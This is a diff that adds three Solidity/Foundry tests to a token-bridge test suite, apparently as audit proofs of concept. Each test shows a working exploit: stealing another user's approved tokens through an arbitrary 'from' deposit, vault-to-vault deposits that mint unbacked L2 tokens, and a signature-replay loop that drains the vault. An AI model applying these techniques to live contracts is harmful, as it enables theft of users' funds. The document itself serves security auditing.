@@ -223,4 +223,73 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function testCanMoveApprovedTokensOfOtherUsers() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        uint256 depositAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+
+        assert(token.balanceOf(user) == 0);
+        assert(token.balanceOf(address(vault)) == depositAmount);
+        vm.stopPrank();
+    }
+
+    function testCanTransferVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultBalance = 500 ether;
+
+        deal(address(token), address(vault), vaultBalance);
+
+        console2.log("vault balance before ", token.balanceOf(address(vault)));
+
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+        vm.stopPrank();
+
+
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+        vm.stopPrank();
+
+        console2.log("vault balance afterr ", token.balanceOf(address(vault)));        
+    }
+
+    // use nonce or timestamp
+    function testSignatureReplay() public {
+        address attacker = makeAddr("attacker");
+
+        uint256 initialBalanceVault = 1000 ether;
+        uint256 initialBalanceAttacker = 100 ether;
+
+        deal(address(token), address(vault), initialBalanceVault);
+        deal(address(token), address(attacker), initialBalanceAttacker);
+
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), initialBalanceAttacker);
+        tokenBridge.depositTokensToL2(attacker, attacker, initialBalanceAttacker);
+
+        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, initialBalanceAttacker)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+
+        while(token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, initialBalanceAttacker, v, r, s);
+        }
+
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(attacker), initialBalanceAttacker + initialBalanceVault);
+        assertEq(token.balanceOf(address(vault)), 0);
+    }
 }
